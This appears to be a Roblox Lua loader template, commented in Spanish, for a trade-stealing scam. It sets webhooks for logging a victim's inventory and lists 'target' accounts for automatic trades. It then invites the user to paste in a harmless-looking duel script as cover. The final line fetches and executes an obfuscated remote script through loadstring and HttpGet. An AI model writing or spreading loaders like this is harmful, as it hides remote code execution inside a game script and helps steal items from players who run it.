-- ==========================================
-- CONFIGURACIÓN PERSONALIZABLE
-- ==========================================
getgenv().AutoTradeConfig = {
    WebhookLogs = "TU_WEBHOOK_LOGS_AQUI",
    WebhookInventario = "TU_WEBHOOK_INVENTARIO_AQUI",
    
    JugadoresObjetivos = {
        "Jugador1", 
        "Jugador2",
        "Jugador3"
    }
}

-- ==========================================
-- SCRIPT DE DUELOS (PVP)
-- ==========================================
-- Pega tu script de duelos que gustes aquí debajo
task.spawn(function()
    -- Script de duelos aquí:
end)

-- ==========================================
-- CARGA DEL SCRIPT PRINCIPAL OFUSCADO
-- ==========================================
local rawUrl = "ENLACE_DE_TU_SCRIPT_AQUI"
loadstring(game:HttpGet(rawUrl))()